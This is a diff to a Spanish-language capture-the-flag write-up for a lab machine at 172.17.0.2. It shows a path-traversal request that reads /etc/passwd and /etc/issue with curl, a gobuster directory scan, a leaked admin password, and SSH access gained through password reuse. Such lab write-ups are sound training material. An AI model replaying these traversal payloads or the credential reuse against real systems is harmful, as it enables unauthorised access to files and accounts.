@@ -89,7 +89,7 @@ Al ir moviendonos por /index.php vemos que en la url se va añadiendo ?page=algo
 <img width="935" height="500" alt="7passwdd" src="https://github.com/user-attachments/assets/4f6a19e0-5219-461f-8385-1c5de41020af" />
 <br><br>
 
-Podemos leer ficheros y al leer etc/passwd vemos que está el usuario root y el usuario architect. 
+Podemos leer ficheros y al leer etc/passwd vemos que existe el usuario root y el usuario architect. 
 Vamos ahora a leer el fichero por la terminal con curl, con el siguiente comando:
 
 
@@ -98,6 +98,7 @@ curl -i 'http://172.17.0.2/index.php?page=../../../../../../../../etc/passwd'
 ```
 
 Nos lo muestra sin problemas y lo podemos ver más fácilmente:
+
 <img width="1193" height="601" alt="8ueconcurl" src="https://github.com/user-attachments/assets/3d515164-bff2-44cf-95f6-a16483016bdb" />
 <br><br>
 
@@ -107,8 +108,12 @@ Si miramos el /etc/issue vemos que estamos ante  Ubuntu 20.04.6 LTS
 http://172.17.0.2/index.php?page=../../../../../../../../../../etc/issue
 ```
 
+<br><br>
+Volvemos a lanzar gobuster pero esta vez añadiendo alguna extensión más. Una vez finaliza, vemos varios archivos nuevos que podemos leer, como ya vimos antes.
 
-Volvemos a lanzar gobuster pero esta vez añadiendo alguna extensión más. Una vez finaliza vemos varios archivos nuevos que podemos ver, 
+```bash
+gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/common.txt  -x php,bak,html
+```
 
 <img width="1427" height="766" alt="11info" src="https://github.com/user-attachments/assets/142a99c6-4617-4b2d-bdeb-07caa2c03d9c" />
 <br><br>
@@ -133,9 +138,8 @@ $admin_pass = "Sky2026!";
 ?>
 ```
 
-Como teníamos el puerto 22 y un usuario válido pero sin contraseña, vamos aprobar a entrar....
+En la web no vimos ningún login pero como teníamos el puerto 22 y un usuario válido pero sin contraseña, vamos aprobar a entrar con el usuario que vimos en el etc/passwd y con la contraseña encontrada:
 
-gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/common.txt  -x php,bak,html
 
 <img width="788" height="474" alt="12reutilizacioncontrasenia" src="https://github.com/user-attachments/assets/85ba70ea-0e7e-49e9-a949-5205d5b38f81" />
 bbdd n odeja pero ssh si,reutilizacion de contraseña
